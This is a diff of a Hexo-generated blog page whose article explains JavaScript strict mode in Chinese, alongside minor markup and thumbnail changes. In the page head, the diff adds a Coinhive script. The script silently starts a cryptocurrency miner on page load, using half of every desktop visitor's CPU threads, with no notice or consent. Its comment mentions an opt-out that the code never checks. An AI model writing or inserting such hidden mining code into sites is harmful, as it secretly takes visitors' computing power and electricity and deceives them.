@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2017/03/20/Strict-mode/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="ECMAScript5的严格模式是JavaScript中的一种限制性更强的变种方式。严格模式不是一个子集：它在语义上与正常代码有着明显的差异。">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2017-03-21T02:10:51.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="严格模式·Strict mode">
@@ -63,6 +64,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -298,9 +313,9 @@
 <p>第一，在严格模式下通过<code>this</code>传递给一个函数的值不会被强制转换为一个对象。对一个普通的函数来说，<code>this</code>总会是一个对象：不管调用时<code>this</code>    它本来就是一个对象；还是用布尔值，字符串或者数字调用函数时函数里面被封装成对象的<code>this</code>；还是使用<code>undefined</code>或者<code>null</code>调用函数式<code>this</code>代表的全局对象（使用<code>call</code>, <code>apply</code>或者<code>bind</code>方法来指定一个确定的<code>this</code>）。这种自动转化为对象的过程不仅是一种性能上的损耗，同时在浏览器中暴露出全局对象也会成为安全隐患，因为全局对象提供了访问那些所谓安全的JavaScript环境必须限制的功能的途径。<strong>所以对于一个开启严格模式的函数，指定的<code>this</code>不再被封装为对象，而且如果没有指定<code>this</code>的话它值是<code>undefined</code></strong>：
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">"use strict"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>; &#125;</div><div class="line"><span class="built_in">console</span>.assert(fun() === <span class="literal">undefined</span>);</div><div class="line"><span class="built_in">console</span>.assert(fun.call(<span class="number">2</span>) === <span class="number">2</span>);</div><div class="line"><span class="built_in">console</span>.assert(fun.apply(<span class="literal">null</span>) === <span class="literal">null</span>);</div><div class="line"><span class="built_in">console</span>.assert(fun.call(<span class="literal">undefined</span>) === <span class="literal">undefined</span>);</div><div class="line"><span class="built_in">console</span>.assert(fun.bind(<span class="literal">true</span>)() === <span class="literal">true</span>);</div></pre></td></tr></table></figure></p>
 <p>第二，在严格模式中再也不能通过广泛实现的ECMAScript扩展“游走于”JavaScript的栈中。在普通模式下用这些扩展的话，当一个叫fun的函数正在被调用的时候，fun.caller是最后一个调用fun的函数，而且fun.arguments包含调用fun时用的形参。这两个扩展接口对于“安全”JavaScript而言都是有问题的，因为他们允许“安全的”代码访问”专有”函数和他们的（通常是没有经过保护的）形参。如果fun在严格模式下，那么fun.caller和fun.arguments都是不可删除的属性而且在存值、取值时都会报错：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">restricted</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line"><span class="meta">  "use strict"</span>;</div><div class="line">  restricted.caller;    <span class="comment">// 抛出类型错误</span></div><div class="line">  restricted.arguments; <span class="comment">// 抛出类型错误</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">privilegedInvoker</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> restricted();</div><div class="line">&#125;</div><div class="line">privilegedInvoker();</div></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">restricted</span>(<span class="params"></span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="meta">  "use strict"</span>;</div><div class="line">  restricted.caller;    <span class="comment">// 抛出类型错误</span></div><div class="line">  restricted.arguments; <span class="comment">// 抛出类型错误</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">privilegedInvoker</span>(<span class="params"></span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> restricted();</div><div class="line">&#125;</div><div class="line">privilegedInvoker();</div></pre></td></tr></table></figure>
 <p>第三，严格模式下的arguments不会再提供访问与调用这个函数相关的变量的途径。在一些旧时的ECMAScript实现中arguments.caller曾经是一个对象，里面存储的属性指向那个函数的变量。这是一个安全隐患，因为它通过函数抽象打破了本来被隐藏起来的保留值；它同时也是引起大量优化工作的原因。出于这些原因，现在的浏览器没有实现它。但是因为它这种历史遗留的功能，arguments.caller在严格模式下同样是一个不可被删除的属性，在赋值或者取值时会报错：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">"use strict"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">a, b</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="meta">  "use strict"</span>;</div><div class="line">  <span class="keyword">var</span> v = <span class="number">12</span>;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">arguments</span>.caller; <span class="comment">// 抛出类型错误</span></div><div class="line">&#125;</div><div class="line">fun(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 不会暴露v（或者a，或者b）</span></div></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">"use strict"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">a, b</span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="meta">  "use strict"</span>;</div><div class="line">  <span class="keyword">var</span> v = <span class="number">12</span>;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">arguments</span>.caller; <span class="comment">// 抛出类型错误</span></div><div class="line">&#125;</div><div class="line">fun(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 不会暴露v（或者a，或者b）</span></div></pre></td></tr></table></figure>
 <h3 id="为未来的ECMAScript版本铺平道路"><a href="#为未来的ECMAScript版本铺平道路" class="headerlink" title="为未来的ECMAScript版本铺平道路"></a>为未来的ECMAScript版本铺平道路</h3><p>未来版本的ECMAScript很有可能会引入新语法，ECMAScript5中的严格模式就提早设置了一些限制来减轻之后版本改变产生的影响。如果提早使用了严格模式中的保护机制，那么做出改变就会变得更容易。</p>
 <p>首先，在严格模式中一部分字符变成了保留的关键字。这些字符包括implements, interface, let, package, private, protected, public, static和yield。在严格模式下，你不能再用这些名字作为变量名或者形参名。
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">package</span>(<span class="params">protected</span>)</span>&#123; <span class="comment">// !!!</span></div><div class="line"><span class="meta">  "use strict"</span>;</div><div class="line">  <span class="keyword">var</span> implements; <span class="comment">// !!!</span></div><div class="line"></div><div class="line">  interface: <span class="comment">// !!!</span></div><div class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">break</span> interface; <span class="comment">// !!!</span></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// !!!</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">static</span>) </span>&#123; <span class="string">'use strict'</span>; &#125; <span class="comment">// !!!</span></div></pre></td></tr></table></figure></p>
@@ -319,7 +334,7 @@
 
 </div>
 
-    <a data-url="http://kingzez.com/2017/03/20/Strict-mode/" data-id="cj3wdnjdo001r09hedr7ze2oy" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2017/03/20/Strict-mode/" data-id="cjcc61di8001s70fy8vfn3hs9" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -457,7 +472,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -492,7 +507,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -527,7 +542,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -597,7 +612,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -651,7 +666,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
